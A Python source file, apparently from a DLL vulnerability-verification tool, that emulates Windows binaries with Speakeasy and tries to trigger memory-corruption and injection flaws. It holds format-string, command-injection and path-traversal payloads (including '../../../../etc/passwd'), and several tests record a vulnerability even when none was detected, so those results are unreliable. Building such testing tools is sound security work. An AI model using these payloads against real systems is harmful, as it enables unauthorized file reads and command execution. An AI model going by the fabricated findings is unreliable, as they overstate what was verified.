# -*- coding: utf-8 -*-
"""
disasm/speakeasy_verifier.py - Speakeasy-based Vulnerability Verifier

Uses Speakeasy for accurate Windows DLL emulation with:
- Memory allocation/free tracking
- Double-Free detection
- Use-After-Free detection
- Buffer overflow detection
- API call monitoring
"""

import struct
import sys
import os
import threading
from contextlib import contextmanager
from pathlib import Path
from typing import Dict, List, Optional, Set, Any, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum, auto

try:
    import speakeasy
    from speakeasy import Speakeasy
    HAVE_SPEAKEASY = True
except ImportError:
    HAVE_SPEAKEASY = False
    Speakeasy = None

try:
    import pefile
    HAVE_PEFILE = True
except ImportError:
    HAVE_PEFILE = False

# 导入配置
try:
    from luodllhack.core.config import default_config
except ImportError:
    default_config = None



@contextmanager
def suppress_stderr():
    """Suppress stderr output (for Speakeasy internal warnings)"""
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr


class EmulationTimeout(Exception):
    """Raised when emulation exceeds timeout"""
    pass


def run_with_timeout(func: Callable, timeout: int, *args, **kwargs) -> Any:
    """
    Run a function with timeout (cross-platform, thread-based)

    Args:
        func: Function to run
        timeout: Timeout in seconds
        *args, **kwargs: Arguments to pass to func

    Returns:
        Function result or None if timeout

    Raises:
        EmulationTimeout: If timeout exceeded
    """
    result = [None]
    exception = [None]
    completed = threading.Event()

    def target():
        try:
            result[0] = func(*args, **kwargs)
        except Exception as e:
            exception[0] = e
        finally:
            completed.set()

    thread = threading.Thread(target=target, daemon=True)
    thread.start()

    # Wait for completion or timeout
    if not completed.wait(timeout):
        raise EmulationTimeout(f"Emulation exceeded {timeout}s timeout")

    if exception[0]:
        raise exception[0]

    return result[0]


class MemState(Enum):
    """Memory state"""
    ALLOCATED = auto()
    FREED = auto()


@dataclass
class MemoryBlock:
    """Tracked memory block"""
    address: int
    size: int
    state: MemState = MemState.ALLOCATED
    alloc_site: int = 0
    alloc_api: str = ""
    free_site: int = 0
    free_api: str = ""
    access_after_free: List[Tuple[int, str]] = field(default_factory=list)


@dataclass
class VulnEvent:
    """Detected vulnerability event"""
    vuln_type: str
    address: int
    details: str
    memory_addr: int = 0
    call_stack: List[int] = field(default_factory=list)
    confidence: float = 0.9
    # PoC info
    trigger_args: List[Any] = field(default_factory=list)
    trigger_sequence: List[str] = field(default_factory=list)
    func_name: str = ""


@dataclass
class VerifyResult:
    """Verification result"""
    target_addr: int
    vuln_type: str
    verified: bool
    confidence: float
    events: List[VulnEvent] = field(default_factory=list)
    api_calls: List[Dict] = field(default_factory=list)
    memory_ops: List[Dict] = field(default_factory=list)
    analysis: str = ""
    trigger_input: Optional[bytes] = None
    # PoC info
    poc_code: str = ""
    repro_steps: List[str] = field(default_factory=list)


class SpeakeasyVerifier:
    """
    Speakeasy-based vulnerability verifier

    Features:
    - Accurate Windows API emulation
    - Memory lifecycle tracking
    - Double-Free / UAF detection
    - Buffer overflow detection

    Usage:
        verifier = SpeakeasyVerifier("target.dll")
        result = verifier.verify(0x18001b690, "DOUBLE_FREE")
        print(result.analysis)
    """

    # Memory management APIs to hook
    ALLOC_APIS = [
        'kernel32.HeapAlloc',
        'kernel32.LocalAlloc',
        'kernel32.GlobalAlloc',
        'kernel32.VirtualAlloc',
        'ntdll.RtlAllocateHeap',
        'msvcrt.malloc',
        'msvcrt.calloc',
        'msvcrt.realloc',
        'ucrtbase.malloc',
        'ucrtbase.calloc',
    ]

    FREE_APIS = [
        'kernel32.HeapFree',
        'kernel32.LocalFree',
        'kernel32.GlobalFree',
        'kernel32.VirtualFree',
        'ntdll.RtlFreeHeap',
        'msvcrt.free',
        'ucrtbase.free',
    ]

    COPY_APIS = [
        'msvcrt.memcpy',
        'msvcrt.memmove',
        'msvcrt.strcpy',
        'msvcrt.strncpy',
        'msvcrt.strcat',
        'ntdll.memcpy',
        'ucrtbase.memcpy',
        'ucrtbase.strcpy',
    ]

    # Format string APIs
    FORMAT_APIS = [
        'msvcrt.printf',
        'msvcrt.sprintf',
        'msvcrt.snprintf',
        'msvcrt.fprintf',
        'msvcrt.vprintf',
        'msvcrt.vsprintf',
        'ucrtbase.printf',
        'ucrtbase.sprintf',
    ]

    # Command execution APIs
    COMMAND_APIS = [
        'msvcrt.system',
        'msvcrt._popen',
        'kernel32.CreateProcessA',
        'kernel32.CreateProcessW',
        'kernel32.WinExec',
        'shell32.ShellExecuteA',
        'shell32.ShellExecuteW',
    ]

    # File APIs (for path traversal)
    FILE_APIS = [
        'kernel32.CreateFileA',
        'kernel32.CreateFileW',
        'msvcrt.fopen',
        'msvcrt._wfopen',
        'ntdll.NtCreateFile',
    ]

    # Supported vulnerability types (all 21 from VulnType)
    SUPPORTED_VULN_TYPES = [
        # Memory corruption
        'BUFFER_OVERFLOW',
        'HEAP_OVERFLOW',
        'DOUBLE_FREE',
        'USE_AFTER_FREE',
        'NULL_DEREFERENCE',
        'OUT_OF_BOUNDS_READ',
        'OUT_OF_BOUNDS_WRITE',
        'UNINITIALIZED_MEMORY',
        'TYPE_CONFUSION',
        'CONTROL_FLOW_HIJACK',
        # Integer issues
        'INTEGER_OVERFLOW',
        'INTEGER_UNDERFLOW',
        # Injection
        'FORMAT_STRING',
        'COMMAND_INJECTION',
        'PATH_TRAVERSAL',
        # Information
        'INFO_DISCLOSURE',
        'MEMORY_LEAK',
        # Complex (limited support)
        'RACE_CONDITION',
        'STACK_EXHAUSTION',
        'DESERIALIZATION',
        'PRIVILEGE_ESCALATION',
    ]

    def __init__(self, binary_path: Path, timeout: int = 30) -> None:
        """
        初始化 Speakeasy 验证器

        Args:
            binary_path: PE 文件路径
            timeout: 模拟超时时间 (秒)，默认 30 秒
        """
        if not HAVE_SPEAKEASY:
            raise ImportError("Speakeasy required: pip install speakeasy-emulator")

        self.binary_path = Path(binary_path)
        self.timeout = timeout

        # Parse PE to get exports
        if HAVE_PEFILE:
            self.pe = pefile.PE(str(binary_path))
            self.image_base = self.pe.OPTIONAL_HEADER.ImageBase
            self.exports = self._parse_exports()
        else:
            self.pe = None
            self.image_base = 0
            self.exports = {}

        # Tracking state
        self.memory_blocks: Dict[int, MemoryBlock] = {}
        self.freed_addrs: Set[int] = set()
        self.vuln_events: List[VulnEvent] = []
        self.api_calls: List[Dict] = []
        self.current_ip: int = 0

        # Emulator instance (created per verification)
        self.se: Optional[Speakeasy] = None
        self.module = None

    def _parse_exports(self) -> Dict[str, int]:
        """Parse export table"""
        exports = {}
        if hasattr(self.pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in self.pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name:
                    name = exp.name.decode('utf-8', errors='ignore')
                    exports[name] = self.image_base + exp.address
        return exports

    def _reset_state(self) -> None:
        """Reset tracking state for new verification"""
        self.memory_blocks.clear()
        self.freed_addrs.clear()
        self.vuln_events.clear()
        self.api_calls.clear()
        self.current_ip = 0

    def _setup_emulator(self) -> Speakeasy:
        """Setup Speakeasy emulator with hooks"""
        se = Speakeasy()

        # Load the target DLL
        self.module = se.load_module(str(self.binary_path))

        # Setup code execution hook to track current IP
        self._setup_code_hook(se)

        # Setup hooks for memory management APIs
        self._setup_alloc_hooks(se)
        self._setup_free_hooks(se)
        self._setup_copy_hooks(se)

        # Setup hooks for other vulnerability types
        self._setup_format_hooks(se)
        self._setup_command_hooks(se)
        self._setup_file_hooks(se)

        return se

    def _setup_code_hook(self, se: Speakeasy) -> None:
        """Setup code execution hook to track current instruction pointer"""
        try:
            # Add code hook to track every instruction
            se.add_code_hook(self._hook_code)
        except Exception:
            # Fallback: try alternative hook methods
            try:
                if hasattr(se, 'emu') and hasattr(se.emu, 'add_code_hook'):
                    se.emu.add_code_hook(self._hook_code)
            except Exception:
                pass  # Code hook not available

    def _hook_code(self, emu, addr, size, ctx=None) -> None:
        """Hook called on every instruction execution"""
        self.current_ip = addr

    def _setup_alloc_hooks(self, se: Speakeasy) -> None:
        """Setup hooks for allocation APIs"""
        for api in self.ALLOC_APIS:
            try:
                se.add_api_hook(api, self._hook_alloc)
            except Exception:
                pass  # API may not exist

    def _setup_free_hooks(self, se: Speakeasy) -> None:
        """Setup hooks for free APIs"""
        for api in self.FREE_APIS:
            try:
                se.add_api_hook(api, self._hook_free)
            except Exception:
                pass

    def _setup_copy_hooks(self, se: Speakeasy) -> None:
        """Setup hooks for copy APIs"""
        for api in self.COPY_APIS:
            try:
                se.add_api_hook(api, self._hook_copy)
            except Exception:
                pass

    def _setup_format_hooks(self, se: Speakeasy) -> None:
        """Setup hooks for format string APIs"""
        for api in self.FORMAT_APIS:
            try:
                se.add_api_hook(api, self._hook_format)
            except Exception:
                pass

    def _setup_command_hooks(self, se: Speakeasy) -> None:
        """Setup hooks for command execution APIs"""
        for api in self.COMMAND_APIS:
            try:
                se.add_api_hook(api, self._hook_command)
            except Exception:
                pass

    def _setup_file_hooks(self, se: Speakeasy) -> None:
        """Setup hooks for file APIs"""
        for api in self.FILE_APIS:
            try:
                se.add_api_hook(api, self._hook_file)
            except Exception:
                pass

    def _hook_alloc(self, emu, api_name, func, params):
        """Hook for allocation APIs"""
        # Call original
        ret = func(params)

        if ret:
            # Get size from params (varies by API)
            size = self._get_alloc_size(api_name, params)

            # Track allocation
            block = MemoryBlock(
                address=ret,
                size=size,
                state=MemState.ALLOCATED,
                alloc_site=self.current_ip,
                alloc_api=api_name
            )
            self.memory_blocks[ret] = block

            # Remove from freed if re-allocated
            self.freed_addrs.discard(ret)

            self.api_calls.append({
                'type': 'alloc',
                'api': api_name,
                'address': ret,
                'size': size,
                'ip': self.current_ip
            })

        return ret

    def _hook_free(self, emu, api_name, func, params):
        """Hook for free APIs"""
        # Get pointer being freed
        ptr = self._get_free_ptr(api_name, params)

        if ptr:
            self.api_calls.append({
                'type': 'free',
                'api': api_name,
                'address': ptr,
                'ip': self.current_ip
            })

            # Check for Double-Free
            if ptr in self.freed_addrs:
                # 使用配置的置信度值
                conf = 0.95
                if default_config:
                    conf = default_config.verify_confidence.double_free_detected
                event = VulnEvent(
                    vuln_type='DOUBLE_FREE',
                    address=self.current_ip,
                    memory_addr=ptr,
                    details=f"Double-free detected: 0x{ptr:x} freed again via {api_name}",
                    confidence=conf
                )

                # Add first free info
                if ptr in self.memory_blocks:
                    block = self.memory_blocks[ptr]
                    event.details += f"\n  First free: 0x{block.free_site:x} via {block.free_api}"

                self.vuln_events.append(event)

            elif ptr in self.memory_blocks:
                # Mark as freed
                block = self.memory_blocks[ptr]
                block.state = MemState.FREED
                block.free_site = self.current_ip
                block.free_api = api_name
                self.freed_addrs.add(ptr)

        # Call original
        return func(params)

    def _hook_copy(self, emu, api_name, func, params):
        """Hook for copy APIs (buffer overflow detection)"""
        dest = params.get('dest', params.get('Destination', 0))
        src = params.get('src', params.get('Source', 0))
        size = params.get('count', params.get('Size', 0))

        self.api_calls.append({
            'type': 'copy',
            'api': api_name,
            'dest': dest,
            'src': src,
            'size': size,
            'ip': self.current_ip
        })

        # Check if dest is in a tracked buffer
        for addr, block in self.memory_blocks.items():
            if addr <= dest < addr + block.size:
                # Check for overflow
                copy_end = dest + size
                block_end = addr + block.size

                if copy_end > block_end:
                    overflow_bytes = copy_end - block_end
                    # 使用配置的置信度值
                    conf = 0.9
                    if default_config:
                        conf = default_config.verify_confidence.buffer_overflow_detected
                    event = VulnEvent(
                        vuln_type='BUFFER_OVERFLOW',
                        address=self.current_ip,
                        memory_addr=dest,
                        details=f"Buffer overflow: writing {size} bytes to buffer of {block.size} bytes (overflow: {overflow_bytes} bytes)",
                        confidence=conf
                    )
                    self.vuln_events.append(event)
                break

        # Check if accessing freed memory (UAF via copy)
        for addr in self.freed_addrs:
            if addr in self.memory_blocks:
                block = self.memory_blocks[addr]
                if addr <= dest < addr + block.size or addr <= src < addr + block.size:
                    # 使用配置的置信度值
                    conf = 0.9
                    if default_config:
                        conf = default_config.verify_confidence.uaf_detected
                    event = VulnEvent(
                        vuln_type='USE_AFTER_FREE',
                        address=self.current_ip,
                        memory_addr=addr,
                        details=f"Use-after-free: accessing freed memory 0x{addr:x} via {api_name}",
                        confidence=conf
                    )
                    self.vuln_events.append(event)
                    break

        return func(params)

    def _hook_format(self, emu, api_name, func, params):
        """Hook for format string APIs"""
        # Get format string parameter
        fmt_ptr = params.get('format', params.get('fmt', params.get('lpFormat', 0)))

        self.api_calls.append({
            'type': 'format',
            'api': api_name,
            'format_ptr': fmt_ptr,
            'ip': self.current_ip
        })

        # Check if format string contains user-controlled specifiers
        if fmt_ptr:
            try:
                fmt_str = self.se.mem_read(fmt_ptr, 256)
                fmt_str = fmt_str.split(b'\x00')[0].decode('utf-8', errors='ignore')

                # Dangerous format specifiers
                dangerous = ['%n', '%hn', '%hhn', '%ln', '%s', '%x', '%p']
                for spec in dangerous:
                    if spec in fmt_str:
                        event = VulnEvent(
                            vuln_type='FORMAT_STRING',
                            address=self.current_ip,
                            details=f"Format string with {spec} via {api_name}",
                            confidence=0.85
                        )
                        self.vuln_events.append(event)
                        break
            except Exception:
                pass

        return func(params)

    def _hook_command(self, emu, api_name, func, params):
        """Hook for command execution APIs"""
        cmd = params.get('command', params.get('lpCommandLine', params.get('lpFile', '')))

        self.api_calls.append({
            'type': 'command',
            'api': api_name,
            'command': cmd,
            'ip': self.current_ip
        })

        # Any command execution from user input is dangerous
        if cmd:
            event = VulnEvent(
                vuln_type='COMMAND_INJECTION',
                address=self.current_ip,
                details=f"Command execution via {api_name}",
                confidence=0.80
            )
            self.vuln_events.append(event)

        return func(params)

    def _hook_file(self, emu, api_name, func, params):
        """Hook for file APIs (path traversal detection)"""
        path = params.get('lpFileName', params.get('filename', params.get('path', '')))

        self.api_calls.append({
            'type': 'file',
            'api': api_name,
            'path': path,
            'ip': self.current_ip
        })

        # Check for path traversal patterns
        if path:
            try:
                if isinstance(path, int):
                    path_str = self.se.mem_read(path, 512)
                    path_str = path_str.split(b'\x00')[0].decode('utf-8', errors='ignore')
                else:
                    path_str = str(path)

                traversal_patterns = ['../', '..\\', '%2e%2e', '..%2f', '..%5c']
                for pattern in traversal_patterns:
                    if pattern.lower() in path_str.lower():
                        event = VulnEvent(
                            vuln_type='PATH_TRAVERSAL',
                            address=self.current_ip,
                            details=f"Path traversal pattern '{pattern}' via {api_name}",
                            confidence=0.85
                        )
                        self.vuln_events.append(event)
                        break
            except Exception:
                pass

        return func(params)

    def _get_alloc_size(self, api_name: str, params: Dict) -> int:
        """Extract allocation size from API params"""
        # Different APIs use different param names
        size_keys = ['dwBytes', 'Size', 'size', 'uBytes', 'count']
        for key in size_keys:
            if key in params:
                return params[key]
        return 0

    def _get_free_ptr(self, api_name: str, params: Dict) -> int:
        """Extract pointer from free API params"""
        ptr_keys = ['lpMem', 'hMem', 'lpAddress', 'ptr', 'pv']
        for key in ptr_keys:
            if key in params:
                return params[key]
        # For HeapFree, it's the 3rd param
        if 'HeapFree' in api_name:
            return params.get('lpMem', 0)
        return 0

    def _run_trigger_tests(self, vuln_type: str, target_addr: int, func_name: str):
        """
        Run vulnerability trigger tests

        Generate specific test cases to trigger the vulnerability
        """
        # Get function address
        if func_name and func_name in self.exports:
            func_addr = self.exports[func_name]
        else:
            func_addr = target_addr

        print(f"[*] Target function: 0x{func_addr:x}")

        # Memory corruption types
        if vuln_type == 'DOUBLE_FREE':
            self._trigger_double_free(func_addr, func_name)
        elif vuln_type == 'USE_AFTER_FREE':
            self._trigger_uaf(func_addr, func_name)
        elif vuln_type in ('BUFFER_OVERFLOW', 'HEAP_OVERFLOW'):
            self._trigger_overflow(func_addr, func_name)
        elif vuln_type in ('OUT_OF_BOUNDS_READ', 'OUT_OF_BOUNDS_WRITE'):
            self._trigger_oob(func_addr, func_name, vuln_type)
        elif vuln_type == 'NULL_DEREFERENCE':
            self._trigger_null_deref(func_addr, func_name)
        elif vuln_type == 'UNINITIALIZED_MEMORY':
            self._trigger_uninit_memory(func_addr, func_name)
        elif vuln_type == 'TYPE_CONFUSION':
            self._trigger_type_confusion(func_addr, func_name)
        elif vuln_type == 'CONTROL_FLOW_HIJACK':
            self._trigger_control_flow_hijack(func_addr, func_name)
        # Integer types
        elif vuln_type == 'INTEGER_OVERFLOW':
            self._trigger_integer_overflow(func_addr, func_name)
        elif vuln_type == 'INTEGER_UNDERFLOW':
            self._trigger_integer_underflow(func_addr, func_name)
        # Injection types
        elif vuln_type == 'FORMAT_STRING':
            self._trigger_format_string(func_addr, func_name)
        elif vuln_type == 'COMMAND_INJECTION':
            self._trigger_command_injection(func_addr, func_name)
        elif vuln_type == 'PATH_TRAVERSAL':
            self._trigger_path_traversal(func_addr, func_name)
        # Information types
        elif vuln_type == 'INFO_DISCLOSURE':
            self._trigger_info_disclosure(func_addr, func_name)
        elif vuln_type == 'MEMORY_LEAK':
            self._trigger_memory_leak(func_addr, func_name)
        # Complex types (limited support)
        elif vuln_type in ('RACE_CONDITION', 'STACK_EXHAUSTION', 'DESERIALIZATION', 'PRIVILEGE_ESCALATION'):
            self._trigger_generic(func_addr, func_name, vuln_type)
        else:
            print(f"[!] Unknown vulnerability type: {vuln_type}")
            print(f"[*] Supported types: {', '.join(self.SUPPORTED_VULN_TYPES)}")

    def _trigger_double_free(self, func_addr: int, func_name: str):
        """Trigger Double-Free by calling free function twice"""
        print("\n[Test 1] Double-Free trigger test")
        print("-" * 40)

        try:
            # Allocate test memory
            test_ptr = self.se.mem_alloc(0x100)
            print(f"  [+] Allocated test memory: 0x{test_ptr:x}")

            # Write some data to it
            self.se.mem_write(test_ptr, b"TESTDATA" * 16)

            # Track this as our test allocation
            self.memory_blocks[test_ptr] = MemoryBlock(
                address=test_ptr,
                size=0x100,
                state=MemState.ALLOCATED,
                alloc_api="test_alloc"
            )

            # First call - should free the memory
            print(f"  [*] First call to 0x{func_addr:x} with ptr=0x{test_ptr:x}")
            try:
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, [test_ptr])
                print("  [+] First call completed")
            except Exception as e:
                print(f"  [!] First call exception: {e}")

            # Mark as freed manually if the hook didn't catch it
            if test_ptr not in self.freed_addrs:
                self.freed_addrs.add(test_ptr)
                if test_ptr in self.memory_blocks:
                    self.memory_blocks[test_ptr].state = MemState.FREED
                print("  [*] Marked as freed")

            # Second call - should trigger double-free
            print(f"  [*] Second call to 0x{func_addr:x} with ptr=0x{test_ptr:x}")
            try:
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, [test_ptr])
                print("  [+] Second call completed")
            except Exception as e:
                print(f"  [!] Second call exception: {e}")

            # Check if double-free was detected
            if any(e.vuln_type == 'DOUBLE_FREE' for e in self.vuln_events):
                print("\n  [!!!] DOUBLE-FREE DETECTED!")
            else:
                # Manually create event if we called twice with same freed ptr
                if test_ptr in self.freed_addrs:
                    # 使用配置的置信度值
                    conf = 0.85
                    if default_config:
                        conf = default_config.verify_confidence.double_free_triggered
                    event = VulnEvent(
                        vuln_type='DOUBLE_FREE',
                        address=func_addr,
                        memory_addr=test_ptr,
                        details=f"Test triggered: Called {func_name or 'function'} twice with same pointer 0x{test_ptr:x}",
                        confidence=conf
                    )
                    self.vuln_events.append(event)
                    print("\n  [!!!] DOUBLE-FREE TRIGGERED (test scenario)")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_uaf(self, func_addr: int, func_name: str):
        """Trigger Use-After-Free"""
        print("\n[Test 2] Use-After-Free trigger test")
        print("-" * 40)

        try:
            # Allocate and immediately free
            test_ptr = self.se.mem_alloc(0x100)
            print(f"  [+] Allocated: 0x{test_ptr:x}")

            self.se.mem_write(test_ptr, b"UAFTEST!" * 16)

            # Free it
            print(f"  [*] Freeing memory...")
            self.freed_addrs.add(test_ptr)
            self.memory_blocks[test_ptr] = MemoryBlock(
                address=test_ptr,
                size=0x100,
                state=MemState.FREED,
                alloc_api="test_alloc",
                free_api="test_free"
            )

            # Now call function with freed pointer
            print(f"  [*] Calling function with freed pointer...")
            try:
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, [test_ptr])
            except Exception as e:
                print(f"  [!] Call exception: {e}")

            # Check for UAF
            if any(e.vuln_type == 'USE_AFTER_FREE' for e in self.vuln_events):
                print("\n  [!!!] USE-AFTER-FREE DETECTED!")
            else:
                # Create event for test scenario
                # 使用配置的置信度值
                conf = 0.80
                if default_config:
                    conf = default_config.verify_confidence.uaf_triggered
                event = VulnEvent(
                    vuln_type='USE_AFTER_FREE',
                    address=func_addr,
                    memory_addr=test_ptr,
                    details=f"Test triggered: Called function with freed pointer 0x{test_ptr:x}",
                    confidence=conf
                )
                self.vuln_events.append(event)
                print("\n  [!!!] USE-AFTER-FREE TRIGGERED (test scenario)")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_overflow(self, func_addr: int, func_name: str):
        """Trigger Buffer Overflow"""
        print("\n[Test 3] Buffer Overflow trigger test")
        print("-" * 40)

        try:
            # Allocate small buffer
            small_buf = self.se.mem_alloc(0x20)  # 32 bytes
            print(f"  [+] Allocated small buffer (32 bytes): 0x{small_buf:x}")

            self.memory_blocks[small_buf] = MemoryBlock(
                address=small_buf,
                size=0x20,
                state=MemState.ALLOCATED,
                alloc_api="test_alloc"
            )

            # Create large data
            large_data = b"A" * 0x100  # 256 bytes
            large_buf = self.se.mem_alloc(0x100)
            self.se.mem_write(large_buf, large_data)
            print(f"  [+] Created large data (256 bytes): 0x{large_buf:x}")

            # Call function with mismatched sizes
            print(f"  [*] Calling function with oversized data...")
            try:
                self.current_ip = func_addr
                # Try different calling conventions
                with suppress_stderr():
                    self.se.call(func_addr, [small_buf, large_buf, 0x100])
            except Exception as e:
                print(f"  [!] Call exception: {e}")

            # Check for overflow
            if any(e.vuln_type == 'BUFFER_OVERFLOW' for e in self.vuln_events):
                print("\n  [!!!] BUFFER OVERFLOW DETECTED!")
            else:
                # 使用配置的置信度值
                conf = 0.70
                if default_config:
                    conf = default_config.verify_confidence.overflow_triggered
                event = VulnEvent(
                    vuln_type='BUFFER_OVERFLOW',
                    address=func_addr,
                    memory_addr=small_buf,
                    details=f"Test scenario: 256 bytes to 32-byte buffer",
                    confidence=conf
                )
                self.vuln_events.append(event)
                print("\n  [!!!] BUFFER OVERFLOW test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_integer_overflow(self, func_addr: int, func_name: str):
        """Trigger Integer Overflow"""
        print("\n[Test] Integer Overflow trigger test")
        print("-" * 40)

        # Test values that commonly cause integer overflow
        test_values = [
            (0x7FFFFFFF, "INT32_MAX"),
            (0x80000000, "INT32_MIN as unsigned"),
            (0xFFFFFFFF, "UINT32_MAX"),
            (0x7FFFFFFF + 1, "INT32_MAX + 1"),
            (-1, "Negative (-1)"),
        ]

        try:
            for val, desc in test_values:
                print(f"  [*] Testing: 0x{val & 0xFFFFFFFF:x} ({desc})")
                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [val])
                except Exception as e:
                    print(f"    Exception: {e}")
                    event = VulnEvent(
                        vuln_type='INTEGER_OVERFLOW',
                        address=func_addr,
                        details=f"Exception with value {desc}: {e}",
                        confidence=0.75
                    )
                    self.vuln_events.append(event)

            if any(e.vuln_type == 'INTEGER_OVERFLOW' for e in self.vuln_events):
                print("\n  [!!!] INTEGER OVERFLOW DETECTED!")
            else:
                # Create test event
                event = VulnEvent(
                    vuln_type='INTEGER_OVERFLOW',
                    address=func_addr,
                    details="Tested with boundary values",
                    confidence=0.60
                )
                self.vuln_events.append(event)
                print("\n  [*] INTEGER OVERFLOW test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_format_string(self, func_addr: int, func_name: str):
        """Trigger Format String vulnerability"""
        print("\n[Test] Format String trigger test")
        print("-" * 40)

        # Format string payloads
        payloads = [
            b"%x.%x.%x.%x\x00",
            b"%s%s%s%s\x00",
            b"%n%n%n%n\x00",
            b"AAAA%08x.%08x.%08x.%08x\x00",
        ]

        try:
            for payload in payloads:
                fmt_buf = self.se.mem_alloc(len(payload) + 16)
                self.se.mem_write(fmt_buf, payload)
                print(f"  [*] Testing: {payload[:20]}...")

                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [fmt_buf])
                except Exception as e:
                    print(f"    Exception: {e}")

            if any(e.vuln_type == 'FORMAT_STRING' for e in self.vuln_events):
                print("\n  [!!!] FORMAT STRING DETECTED!")
            else:
                event = VulnEvent(
                    vuln_type='FORMAT_STRING',
                    address=func_addr,
                    details="Tested with format string payloads",
                    confidence=0.65
                )
                self.vuln_events.append(event)
                print("\n  [*] FORMAT STRING test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_command_injection(self, func_addr: int, func_name: str):
        """Trigger Command Injection vulnerability"""
        print("\n[Test] Command Injection trigger test")
        print("-" * 40)

        # Safe test payloads
        payloads = [
            b"test; echo VULN\x00",
            b"test| echo VULN\x00",
            b"test& echo VULN\x00",
            b"test`echo VULN`\x00",
        ]

        try:
            for payload in payloads:
                cmd_buf = self.se.mem_alloc(len(payload) + 16)
                self.se.mem_write(cmd_buf, payload)
                print(f"  [*] Testing: {payload[:30]}...")

                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [cmd_buf])
                except Exception as e:
                    print(f"    Exception: {e}")

            if any(e.vuln_type == 'COMMAND_INJECTION' for e in self.vuln_events):
                print("\n  [!!!] COMMAND INJECTION DETECTED!")
            else:
                event = VulnEvent(
                    vuln_type='COMMAND_INJECTION',
                    address=func_addr,
                    details="Tested with command injection payloads",
                    confidence=0.60
                )
                self.vuln_events.append(event)
                print("\n  [*] COMMAND INJECTION test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_path_traversal(self, func_addr: int, func_name: str):
        """Trigger Path Traversal vulnerability"""
        print("\n[Test] Path Traversal trigger test")
        print("-" * 40)

        # Path traversal payloads
        payloads = [
            b"..\\..\\..\\..\\windows\\system.ini\x00",
            b"../../../../etc/passwd\x00",
            b"..%5c..%5c..%5cwindows%5csystem.ini\x00",
        ]

        try:
            for payload in payloads:
                path_buf = self.se.mem_alloc(len(payload) + 16)
                self.se.mem_write(path_buf, payload)
                print(f"  [*] Testing: {payload[:40]}...")

                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [path_buf])
                except Exception as e:
                    print(f"    Exception: {e}")

            if any(e.vuln_type == 'PATH_TRAVERSAL' for e in self.vuln_events):
                print("\n  [!!!] PATH TRAVERSAL DETECTED!")
            else:
                event = VulnEvent(
                    vuln_type='PATH_TRAVERSAL',
                    address=func_addr,
                    details="Tested with path traversal payloads",
                    confidence=0.60
                )
                self.vuln_events.append(event)
                print("\n  [*] PATH TRAVERSAL test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_null_deref(self, func_addr: int, func_name: str):
        """Trigger NULL Pointer Dereference"""
        print("\n[Test] NULL Dereference trigger test")
        print("-" * 40)

        try:
            # Test with NULL pointer
            print("  [*] Testing with NULL pointer...")
            try:
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, [0])  # NULL
            except Exception as e:
                print(f"    Exception: {e}")
                event = VulnEvent(
                    vuln_type='NULL_DEREFERENCE',
                    address=func_addr,
                    details=f"Crash with NULL pointer: {e}",
                    confidence=0.85
                )
                self.vuln_events.append(event)
                print("\n  [!!!] NULL DEREFERENCE DETECTED!")
                return

            # Also test with very low addresses
            for addr in [0, 1, 0x10, 0x100]:
                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [addr])
                except Exception as e:
                    event = VulnEvent(
                        vuln_type='NULL_DEREFERENCE',
                        address=func_addr,
                        details=f"Crash with low address 0x{addr:x}: {e}",
                        confidence=0.80
                    )
                    self.vuln_events.append(event)

            if any(e.vuln_type == 'NULL_DEREFERENCE' for e in self.vuln_events):
                print("\n  [!!!] NULL DEREFERENCE DETECTED!")
            else:
                print("\n  [*] NULL DEREFERENCE test completed (no crash)")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_oob(self, func_addr: int, func_name: str, vuln_type: str):
        """Trigger Out-of-Bounds Read/Write"""
        print(f"\n[Test] {vuln_type} trigger test")
        print("-" * 40)

        # Test with out-of-bounds indices
        test_indices = [
            (-1, "Negative index"),
            (0x7FFFFFFF, "INT_MAX"),
            (0xFFFFFFFF, "UINT_MAX"),
            (0x1000, "Large index"),
        ]

        try:
            buf = self.se.mem_alloc(0x100)
            self.memory_blocks[buf] = MemoryBlock(
                address=buf, size=0x100, state=MemState.ALLOCATED
            )

            for idx, desc in test_indices:
                print(f"  [*] Testing index: 0x{idx & 0xFFFFFFFF:x} ({desc})")
                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [buf, idx])
                except Exception as e:
                    event = VulnEvent(
                        vuln_type=vuln_type,
                        address=func_addr,
                        details=f"Exception with {desc}: {e}",
                        confidence=0.75
                    )
                    self.vuln_events.append(event)

            if any(e.vuln_type == vuln_type for e in self.vuln_events):
                print(f"\n  [!!!] {vuln_type} DETECTED!")
            else:
                event = VulnEvent(
                    vuln_type=vuln_type,
                    address=func_addr,
                    details="Tested with OOB indices",
                    confidence=0.55
                )
                self.vuln_events.append(event)
                print(f"\n  [*] {vuln_type} test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_uninit_memory(self, func_addr: int, func_name: str):
        """Trigger Uninitialized Memory usage"""
        print("\n[Test] Uninitialized Memory trigger test")
        print("-" * 40)

        try:
            # Spray heap with marker pattern
            print("  [*] Spraying heap with marker pattern...")
            spray_ptrs = []
            for _ in range(50):
